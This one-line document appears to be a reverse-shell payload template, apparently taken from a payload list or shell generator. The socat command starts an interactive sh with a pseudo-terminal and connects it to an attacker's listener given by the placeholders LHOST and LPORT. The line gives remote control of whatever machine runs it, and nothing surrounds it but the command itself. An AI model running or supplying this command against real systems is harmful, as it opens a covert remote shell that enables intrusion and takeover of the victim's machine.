socat exec:sh,pty,stderr,setsid,sigint,sane tcp:{{ LHOST }}:{{ LPORT }}
